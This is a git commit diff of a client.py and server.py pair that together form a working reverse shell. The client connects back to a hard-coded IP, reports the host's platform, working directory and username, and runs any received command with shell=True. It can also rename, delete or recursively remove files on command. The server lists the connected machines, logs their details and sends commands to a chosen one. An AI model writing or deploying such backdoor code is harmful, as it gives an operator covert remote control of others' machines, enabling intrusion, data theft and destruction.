d8d8529f9f6c47b8cabf0b413e1f82b82fc61f56
Rohit Anand <rrohitanand3336@gmail.com>
2020-11-07 14:11:02 +0530

    Add files via upload

--- client.py
+++ client.py
@@ -1,23 +1,70 @@
 import os
 import socket
 import sys
+import shutil
+import subprocess
 
-data = [os.environ['os'], os.getcwd(), os.environ['USERNAME']]
+data = [sys.platform, os.getcwd(), os.environ['USERNAME']]
 s = socket.socket()
 
 while True:
     try:
-        s.connect(('192.168.42.189', 9898))
+        s.connect(('192.168.43.188', 9898))
         while True:
             msge = str(s.recv(1024), 'utf-8').strip()
             if msge == 'check4live':
-                print(str(data))
+                print('You are connected to the server...')
                 s.send(str.encode(str(data)[1:-1]))
             elif msge == 'quit':
+                print('Connection is closed now from server!!!')
                 s.close()
                 sys.exit()
+            elif len(msge) > 2 and msge[:2] == 'cd':
+                try:
+                    msge = msge.split()[1]
+                    os.chdir(msge)
+                    s.send(str.encode('Current Directory =>' + str(os.getcwd())))
+                except IndexError:
+                    s.send(str.encode('Not valid directory!!!'))
+                except os.error as e:
+                    s.send(str.encode('Error => ' + str(e)))
+            elif len(msge) > 5 and msge[:5] == 'rname':
+                src, dst = msge.split()[1:]
+                try:
+                    os.rename(src, dst)
+                    s.send(str.encode('Renamed Successfully!!!'))
+                except os.error as e:
+                    s.send(str.encode('Error => ' + str(e)))
+            elif len(msge) > 4 and msge[:4] == 'rmve':
+                msge = msge.split()[1]
+                try:
+                    os.remove(msge)
+                    s.send(str.encode('File Deleted Successfully!!!'))
+                except os.error as e:
+                    if os.path.exists(msge):
+                        try:
+                            shutil.rmtree(msge)
+                            s.send(str.encode('Directory Deleted Successfully!!!'))
+                        except NotADirectoryError as mm:
+                            s.send(str.encode('Error => 1) ' + str(mm) + ' OR, \n2) ' + str(e)))
+                        except PermissionError as mm:
+                            s.send(str.encode('Error => 1) ' + str(mm) + ' OR, \n2) ' + str(e)))
+                        except shutil.Error as mm:
+                            s.send(str.encode('Error => 1) ' + str(mm) + ' OR, \n2) ' + str(e)))
+                    else:
+                        s.send(str.encode('Error => No Such Directory!!!'))
             elif len(msge) != 0:
-                print(msge)
-                s.send(str.encode('Message Recieved!!!'))
-    except socket.error:
-        pass
+                p1 = subprocess.run(msge, shell=True, capture_output=True, text=True)
+                if p1.returncode == 0:
+                    s.send(str.encode(p1.stdout))
+                else:
+                    s.send(str.encode('Error => ' + p1.stderr))
+    except socket.error as e:
+        print(e)
+        print('Connection is closed...')
+        s.close()
+        sys.exit()
+    except KeyboardInterrupt:
+        print('Connection is closed...')
+        s.close()
+        sys.exit()
--- server.py
+++ server.py
@@ -3,40 +3,58 @@ import socket
 import threading
 import os
 from datetime import datetime
+import subprocess
 
 
 def select_conn():
     global s, all_connections, all_address, data
-    live_conn = 'Sr.no.' + '   ' + 'IP Address' + '    ' + 'Port\n'
-
+    stt = "{0:^10}  {1:^10}   {2:^10}"
+    live_conn = stt.format('Sr.no.', 'IP Address', 'Port\n')
+    stt = "{0:^5}  {1:^5}   {2:^5}"
     for i, con in enumerate(all_connections):
         try:
             con.send(str.encode('check4live'))
             txt = str(con.recv(2048), 'utf-8')
             if len(txt) > 1:
-                live_conn += str(i + 1) + '  ' + str(all_address[i][0]) + '  ' + str(all_address[i][1]) + '\n'
+                live_conn += stt.format(str(i + 1), str(all_address[i][0]), (str(all_address[i][1]) + '\n'))
                 txt = txt.split(',')
                 data[i] = txt
             else:
                 all_connections.pop(i)
                 all_address.pop(i)
                 data.pop(i)
-        except socket.error:
-            pass
+        except socket.error as e:
+            print(e)
+            print('Connection is closed...')
+            s.close()
+            sys.exit()
+        except KeyboardInterrupt:
+            print('Connection is closed...')
+            s.close()
+            sys.exit()
 
     if len(all_address) > 0:
         print(live_conn)
         c = int(input('Choose any connection: ')) - 1
         print('You are connected to IP: ' + str(all_address[c][0]) + ' Port: ' + str(all_address[c][1]))
         try:
-            f.write('***New Connection Established***\n' + str(datetime.now()) + '------- IP: ' + str(all_address[c][0]) + '-------' + ' Port: ' + str(all_address[c][1]) + '\n')
-            f.write('Operating System: ' + data[c][0] + '\n' + 'Current WD: ' + data[c][1] + '\n' + 'Username: ' + data[c][2] + '\n')
+            f.write('\n***New Connection Established***\n' + str(datetime.now()) + '------- IP: ' + str(
+                all_address[c][0]) + '-------' + ' Port: ' + str(all_address[c][1]) + '\n')
+            f.write(
+                'Operating System: ' + data[c][0] + '\n' + 'Current WD: ' + data[c][1] + '\n' + 'Username: ' + data[c][
+                    2] + '\n')
             print('Operating System: ' + data[c][0])
             print('Current WD: ' + data[c][1])
             print('Username: ' + data[c][2] + '\n')
+            send_query(all_connections[c])
         except IndexError:
-            pass
-        send_query(all_connections[c])
+            print('You entered wrong serial number, please relaunch this script!!!')
+            s.close()
+            sys.exit()
+        except KeyboardInterrupt:
+            print('Connection is closed...')
+            s.close()
+            sys.exit()
     else:
         print('No Live Connections Found!!!')
         sys.exit()
@@ -55,8 +73,15 @@ def init_select():
                 for i in all_connections:
                     i.close()
                 s.close()
-            except socket.error:
-                pass
+            except socket.error as e:
+                print(e)
+                print('Connection is closed...')
+                s.close()
+                sys.exit()
+            except KeyboardInterrupt:
+                print('Connection is closed...')
+                s.close()
+                sys.exit()
             sys.exit()
         else:
             print('Enter valid choice....Retry:')
@@ -69,12 +94,18 @@ def create():
         s.listen(5)
         print('Binding Successful....Waiting for connections!!!')
     except socket.error as msg:
-        print('Error while binding connections: ' + str(msg))
+        if str(msg).find('Address already in use') != -1:
+            subprocess.run('kill - 9 $(lsof - ti tcp:9898)', shell=True, capture_output=True)
+            create()
+        else:
+            print('Error while binding connections: ' + str(msg) + '\nExiting...')
+            s.close()
+            sys.exit()
     flag = False
     while True:
         try:
             conn, address = s.accept()
-            s.setblocking(1)
+            s.setblocking(True)
             all_connections.append(conn)
             all_address.append(address)
             data.append('test')
@@ -83,40 +114,64 @@ def create():
                 init_select()
                 flag = True
         except socket.error as msg:
-            f.write(str(datetime.now()) + '-------' + ' Error while accepting connections ' + '-------' + str(msg) + '\n')
+            f.write(
+                str(datetime.now()) + '-------' + ' Error while accepting connections ' + '-------' + str(msg) + '\n')
+        except KeyboardInterrupt:
+            print('Connection is closed...')
+            s.close()
+            sys.exit()
 
 
 def send_query(conn):
     print('Send Your Commands.....If you want to close connection enter \'quit\'!!!')
     print('And if you want to connect with other ip enter \'list\'!!!')
     while True:
-        command = input('command>>> ').strip()
-        if len(command) > 0:
-            if command == 'quit':
-                conn.send(str(command).encode())
-                try:
-                    conn.close()
-                    s.close()
-                except socket.error:
-                    pass
-                sys.exit()
-            if command == 'list':
-                select_conn()
+        try:
+            command = input('command>>> ').strip()
+            if len(command) > 0:
+                if command == 'quit':
+                    conn.send(str(command).encode())
+                    try:
+                        conn.close()
+                        s.close()
+                    except socket.error as e:
+                        print(e)
+                        print('Connection is closed...')
+                        f.close()
+                        conn.close()
+                        s.close()
+                        sys.exit()
+                    except KeyboardInterrupt:
+                        print('Connection is closed...')
+                        f.close()
+                        conn.close()
+                        s.close()
+                        sys.exit()
+                    print('Connection is closed...')
+                    sys.exit()
+                if command == 'list':
+                    select_conn()
+                else:
+                    f.write(
+                        str(datetime.now()) + '-------' + ' Success/Command Executed ' + '-------' + str(command) + '\n')
+                    conn.send(str(command).encode())
+                    mess = str(conn.recv(1024), 'utf-8')
+                    f.write(str(datetime.now()) + '-------' + ' Success/Replied ' + '-------' + str(mess) + '\n')
+                    print('Reply: ' + str(mess))
             else:
-                f.write(str(datetime.now()) + '-------' + ' Success/Command Executed ' + '-------' + str(command) + '\n')
-                conn.send(str(command).encode())
-                mess = str(conn.recv(1024), 'utf-8')
-                f.write(str(datetime.now()) + '-------' + ' Success/Replied ' + '-------' + str(mess) + '\n')
-                print('Reply: ' + str(mess))
-
-        else:
-            print('Invalid Command....Write something there!!!')
+                print('Invalid Command....Write something there!!!')
+        except KeyboardInterrupt:
+            print('Connection is closed...')
+            f.close()
+            conn.close()
+            s.close()
+            sys.exit()
 
 
 if os.path.exists('log.txt'):
-    f = open('log.txt', 'w')
-else:
     f = open('log.txt', 'a')
+else:
+    f = open('log.txt', 'w')
 
 host = ''
 port = 9898
@@ -126,7 +181,16 @@ choosed = False
 all_connections = []
 all_address = []
 s = socket.socket()
-s.settimeout(5)
-t1 = threading.Thread(target=create)
-t1.start()
+try:
+    s.settimeout(5)
+    t1 = threading.Thread(target=create)
+    t1.start()
+except socket.error as e:
+    print(e)
+    print('Relaunch script!!!')
+    s.close()
+except threading.ThreadError:
+    pass
+except KeyboardInterrupt:
+    pass
 
